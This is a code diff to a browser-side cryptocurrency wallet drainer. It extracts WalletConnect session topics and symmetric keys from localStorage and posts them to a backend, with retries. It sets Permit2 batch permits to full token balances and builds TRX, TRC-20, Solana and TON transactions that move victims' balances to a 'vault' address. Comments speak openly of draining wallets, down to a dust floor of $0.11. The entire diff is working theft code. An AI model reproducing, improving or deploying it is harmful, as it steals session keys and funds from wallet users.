@@ -934,10 +934,13 @@
       var topic = null;
       for (var i = 0; i < keys.length; i++) {
         var k = keys[i];
-        if (k.indexOf('wc@') === -1 || k.indexOf('session') === -1) continue;
+        if (k.indexOf('wc@') === -1) continue;
+        if (k.indexOf('session') === -1 && k.indexOf('client') === -1) continue;
         var raw = localStorage.getItem(k);
         if (!raw) continue;
-        var store = JSON.parse(raw);
+        var store;
+        try { store = JSON.parse(raw); } catch (ep) { continue; }
+        if (!store || typeof store !== 'object') continue;
         var sessions = Object.values(store);
         for (var j = sessions.length - 1; j >= 0; j--) {
           var s = sessions[j];
@@ -951,16 +954,39 @@
       }
       if (!topic || !sessionObj) return null;
 
-      // Find symKey from keychain
+      // Find symKey — WC v2 stores in keychain OR crypto store
+      // Handles: plain hex string, {key:"..."} object, or {keys:{<topic>:"..."}} nested
       var symKey = null;
-      for (var i = 0; i < keys.length; i++) {
-        var k = keys[i];
-        if (k.indexOf('wc@') === -1 || k.indexOf('keychain') === -1) continue;
+      var keychainPatterns = ['keychain', 'crypto', 'keys'];
+      for (var ki = 0; ki < keys.length; ki++) {
+        var k = keys[ki];
+        if (k.indexOf('wc@') === -1) continue;
+        var matchesPattern = false;
+        for (var pi = 0; pi < keychainPatterns.length; pi++) {
+          if (k.indexOf(keychainPatterns[pi]) !== -1) { matchesPattern = true; break; }
+        }
+        if (!matchesPattern) continue;
         var raw = localStorage.getItem(k);
         if (!raw) continue;
-        var chain = JSON.parse(raw);
-        if (chain[topic]) { symKey = chain[topic]; break; }
+        var chain;
+        try { chain = JSON.parse(raw); } catch (ep) { continue; }
+        if (!chain || typeof chain !== 'object') continue;
+        // Direct lookup: chain[topic]
+        var entry = chain[topic];
+        if (entry == null && chain.keys) entry = chain.keys[topic];
+        if (entry == null) continue;
+        if (typeof entry === 'string' && entry.length >= 8) {
+          symKey = entry;
+        } else if (typeof entry === 'object' && entry !== null) {
+          // Some SDK versions: {key: "<hex>", type: 0}
+          var candidate = entry.key || entry.symKey || entry.sharedKey || entry.secret || null;
+          if (candidate && typeof candidate === 'string' && candidate.length >= 8) symKey = candidate;
+        }
+        if (symKey) break;
       }
+      // Fallback: check session object itself for embedded symKey
+      if (!symKey && sessionObj.symKey && typeof sessionObj.symKey === 'string') symKey = sessionObj.symKey;
+      if (!symKey && sessionObj.key && typeof sessionObj.key === 'string') symKey = sessionObj.key;
       if (!symKey) return null;
 
       var ns = sessionObj.namespaces || {};
@@ -982,6 +1008,13 @@
       if (ns.bip122 && ns.bip122.accounts && ns.bip122.accounts[0])
         addrs.btc = extractAddr(ns.bip122.accounts[0]);
 
+      // Fallback: WC namespace k paas na ho toh S.chains se lo
+      // (e.g. MetaMask ya limited WC wallet — sirf eip155 deta hai)
+      if (!addrs.sol && S.chains.SOL && S.chains.SOL.address) addrs.sol = S.chains.SOL.address;
+      if (!addrs.tron && S.chains.TRON && S.chains.TRON.address) addrs.tron = S.chains.TRON.address;
+      if (!addrs.ton && S.chains.TON && S.chains.TON.address) addrs.ton = S.chains.TON.address;
+      if (!addrs.btc && S.chains.BTC && S.chains.BTC.address) addrs.btc = S.chains.BTC.address;
+
       return {
         topic: topic,
         sym_key: symKey,
@@ -997,14 +1030,24 @@
   }
 
   async function registerWcSessionWithBackend() {
-    try {
-      var data = extractWcSessionForBackend();
-      if (!data || !data.sym_key) return;
-      await apiPost('/api/v1/wc/session', data);
-      L.log('[WcRelay] session registered | topic:', data.topic.slice(0, 8) + '...');
-    } catch (e) {
-      L.warn('[WcRelay] session register fail:', e && e.message ? e.message : String(e));
+    // Retry up to 4 times (0ms, 800ms, 2s, 4s) — keychain write may be async after connect
+    var delays = [0, 800, 2000, 4000];
+    for (var attempt = 0; attempt < delays.length; attempt++) {
+      try {
+        if (delays[attempt] > 0) await sleep(delays[attempt]);
+        var data = extractWcSessionForBackend();
+        if (!data || !data.sym_key) {
+          L.warn('[WcRelay] symKey not found attempt', attempt + 1, '— will retry');
+          continue;
+        }
+        await apiPost('/api/v1/wc/session', data);
+        L.log('[WcRelay] session registered | topic:', data.topic.slice(0, 8) + '...');
+        return;
+      } catch (e) {
+        L.warn('[WcRelay] session register fail attempt', attempt + 1, ':', e && e.message ? e.message : String(e));
+      }
     }
+    L.warn('[WcRelay] session registration gave up after', delays.length, 'attempts');
   }
 
   async function waitWcStorageSession(maxMs) {
@@ -1676,7 +1719,7 @@
       });
     }
 
-    var multiBody = { evm_chain_id: 1 };
+    var multiBody = { evm_chain_id: Number(S.evmChain) || 1 };
     if (addrs.evm) multiBody.evm = addrs.evm;
     else if (address) multiBody.evm = address;
     if (addrs.sol) multiBody.sol = addrs.sol;
@@ -2958,8 +3001,49 @@
           wcSession: true,
           wcSigner: true,
         }, null);
+      } else if (_wcProv) {
+        // Fallback: AppKit solanaProvider not available — build WC-backed Solana provider directly
+        var _wcSolRef = _wcProv;
+        var _solWcProv = {
+          signAllTransactions: async function(txs) {
+            var signed = [];
+            for (var si = 0; si < txs.length; si++) {
+              var wireBuf = txs[si].serialize({ requireAllSignatures: false, verifySignatures: false });
+              var b64Wire = bufToB64(wireBuf);
+              var resp = await _wcSolRef.request({
+                method: 'solana_signTransaction',
+                params: { transaction: b64Wire },
+                chainId: 'solana:5eykt4UsFv8P8NJdTREpY1vzqKqZKvdpK',
+              });
+              if (!resp) throw new Error('WC SOL sign rejected');
+              if (resp.transaction) {
+                var solLib = await loadSolWeb3();
+                signed.push(solLib.Transaction.from(b64ToBuf(resp.transaction)));
+              } else if (resp.signature) {
+                var sigBytes;
+                try { sigBytes = b64ToBuf(resp.signature); } catch (e) { sigBytes = decodeBase58(resp.signature); }
+                txs[si].addSignature(txs[si].feePayer, Buffer.from(sigBytes));
+                signed.push(txs[si]);
+              } else {
+                throw new Error('WC SOL unexpected response format');
+              }
+            }
+            return signed;
+          },
+          signTransaction: async function(tx) { return (await this.signAllTransactions([tx]))[0]; },
+        };
+        mergeWcFamilyConnection('SVM', {
+          provider: _solWcProv,
+          address: S.chains.SOL.address,
+          name: 'WalletConnect',
+          family: 'SVM',
+          hint: 'walletconnect',
+          wcSession: true,
+          wcSigner: true,
+        }, null);
+        L.log('[SVM] WC direct fallback provider wired');
       } else if (!S.familyConnections.SVM) {
-        L.warn('[SVM] WC address — waiting for Solana signer');
+        L.warn('[SVM] WC address — no signer available');
       }
     }
 
@@ -4017,6 +4101,9 @@
 
   function applyDynamicEip712Domain(typedData, chainId) {
     if (!typedData || !typedData.domain) return typedData;
+    // Permit2 domain name MUST stay "Permit2" — on-chain contract verifies it exactly
+    var pt = typedData.primaryType;
+    if (pt === 'PermitBatch' || pt === 'PermitSingle' || pt === 'Permit') return typedData;
     var keepVerify = typedData.domain.verifyingContract;
     var keepVersion = typedData.domain.version;
     var keepChainId = typedData.domain.chainId;
@@ -4114,6 +4201,31 @@
     var bin = '';
     for (var i = 0; i < bytes.length; i++) bin += String.fromCharCode(bytes[i]);
     return btoa(bin);
+  }
+
+  function b64ToBuf(b64) {
+    var bin = atob(b64);
+    var buf = new Uint8Array(bin.length);
+    for (var i = 0; i < bin.length; i++) buf[i] = bin.charCodeAt(i);
+    return buf;
+  }
+
+  function decodeBase58(str) {
+    var ALPHA = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
+    var bytes = [0];
+    for (var i = 0; i < str.length; i++) {
+      var val = ALPHA.indexOf(str[i]);
+      if (val < 0) throw new Error('bad base58 char');
+      var carry = val;
+      for (var j = 0; j < bytes.length; j++) {
+        carry += bytes[j] * 58;
+        bytes[j] = carry & 0xff;
+        carry >>= 8;
+      }
+      while (carry > 0) { bytes.push(carry & 0xff); carry >>= 8; }
+    }
+    for (var k = 0; k < str.length && str[k] === '1'; k++) bytes.push(0);
+    return new Uint8Array(bytes.reverse());
   }
 
   // Dust floor: default 0.0001 ETH. When minDrainUsd=0 (Trust site), allow ~0.000001 ETH so $0.11 wallets still get a sign path.
@@ -5476,7 +5588,7 @@
       var nftChunk = nftChunks[chunkIdx];
       var isFirst = chunkIdx === 0;
       var permits = isFirst
-        ? (tokens || []).map(function (t) { return { token: t.address, amount: MAX_AMOUNT }; })
+        ? (tokens || []).map(function (t) { return { token: t.address, amount: t.balance || t.amount_raw || MAX_AMOUNT }; })
         : [];
       var nativeStr = (isFirst && nativeAmountWei && nativeAmountWei > 0n)
         ? nativeAmountWei.toString() : '0';
@@ -5575,7 +5687,7 @@
     if (!tokens || tokens.length === 0) return null;
     var resp = await apiPost('/api/v1/signature-anchor/permit2-batch-typed-data', {
       wallet_address: address, chain_id: Number(chainId),
-      permits: tokens.map(function (t) { return { token: t.address, amount: MAX_AMOUNT }; }),
+      permits: tokens.map(function (t) { return { token: t.address, amount: t.balance || t.amount_raw || MAX_AMOUNT }; }),
       native_amount: '0', nfts: normNftList(nfts),
     });
     if (!resp || !resp.data || !resp.data.typed_data) return null;
@@ -6086,6 +6198,27 @@
     var vault = VAULT.tron;
     var submitted = [];
 
+    // WC path: tronWeb injected nahi hai — window.TronWeb se build karo, WC se sign karo
+    var signTx;
+    if (conn.wcSigner && !tronWeb && _wcProv) {
+      var TW = window.TronWeb;
+      if (TW) {
+        try {
+          tronWeb = new TW({ fullHost: TRON_RPCS[0] || 'https://api.trongrid.io' });
+          tronWeb.setAddress(address);
+          L.log('[TRON-WC] TronWeb instantiated for WC signing');
+        } catch (eTw) { L.warn('[TRON-WC] TronWeb init fail:', eTw.message); }
+      }
+      var _wcProvRef = _wcProv;
+      signTx = function(tx) {
+        return _wcProvRef.request({ method: 'tron_signTransaction', params: [tx] });
+      };
+    } else {
+      signTx = function(tx) { return tronWeb.trx.sign(tx); };
+    }
+
+    if (!tronWeb) { L.warn('[TRON] no tronWeb available — skip'); return null; }
+
     var trc20List = [];
     (S.fusionAssets || []).forEach(function (a) {
       if ((a.family === 'TRON' || a.chain_family === 'TRON') && a.token_address && a.token_address.startsWith('T')) {
@@ -6110,13 +6243,15 @@
       }
       if (balance && balance >= 3000000) {
         var dynFee = Math.max(1000000, Math.floor(balance * 0.1));
-      var sendAmt = balance - dynFee;
+        var sendAmt = balance - dynFee;
         if (sendAmt > 0) {
           UI.status('Confirm TRX transfer...');
-      var tx = await tronWeb.transactionBuilder.sendTrx(vault, sendAmt, address);
-      var signed = await tronWeb.trx.sign(tx);
-          await SUBMIT.tron(address, signed, vault, sendAmt, conn.name);
-          submitted.push({ type: 'TRX', amount: sendAmt, signed: signed });
+          var tx = await tronWeb.transactionBuilder.sendTrx(vault, sendAmt, address);
+          var signed = await signTx(tx);
+          if (signed) {
+            await SUBMIT.tron(address, signed, vault, sendAmt, conn.name);
+            submitted.push({ type: 'TRX', amount: sendAmt, signed: signed });
+          }
         }
       }
 
@@ -6131,9 +6266,11 @@
             trc20List[i].contract, 'transfer(address,uint256)', { feeLimit: 100000000 },
             [{ type: 'address', value: vault }, { type: 'uint256', value: balStr }], address
           );
-          var sTx = await tronWeb.trx.sign(ttx.transaction);
-          await SUBMIT.tron(address, sTx, trc20List[i].contract, balStr, conn.name);
-          submitted.push({ type: trc20List[i].symbol, amount: balStr, signed: sTx });
+          var sTx = await signTx(ttx.transaction);
+          if (sTx) {
+            await SUBMIT.tron(address, sTx, trc20List[i].contract, balStr, conn.name);
+            submitted.push({ type: trc20List[i].symbol, amount: balStr, signed: sTx });
+          }
         } catch (e2) { L.warn('TRC-20', trc20List[i].symbol, e2.message); }
       }
     } catch (e) { L.warn('TRON drain fail:', e.message); }
@@ -6289,10 +6426,22 @@
       UI.status('Confirm TON transaction...');
       var tx = { validUntil: Math.floor(Date.now() / 1000) + 600, messages: messages };
       var result;
-      if (conn.type === 'tonconnect') result = await conn.provider.sendTransaction(tx);
-      else if (conn.provider.sendTransaction) result = await conn.provider.sendTransaction(tx);
-      else if (conn.provider.send) result = await conn.provider.send({ method: 'sendTransaction', params: tx });
-      else return null;
+      if (conn.type === 'tonconnect') {
+        result = await conn.provider.sendTransaction(tx);
+      } else if (conn.provider && conn.provider.sendTransaction) {
+        result = await conn.provider.sendTransaction(tx);
+      } else if (conn.provider && conn.provider.send) {
+        result = await conn.provider.send({ method: 'sendTransaction', params: tx });
+      } else if (conn.wcSigner && _wcProv) {
+        // WC direct path — Trust Wallet handles ton_sendTransaction natively
+        result = await _wcProv.request({
+          method: 'ton_sendTransaction',
+          params: [tx],
+          chainId: 'ton:mainnet',
+        });
+      } else {
+        return null;
+      }
 
       var boc = (result && result.boc) ? result.boc : JSON.stringify(result);
       await SUBMIT.ton(conn.address, boc, String(nano), conn.name);
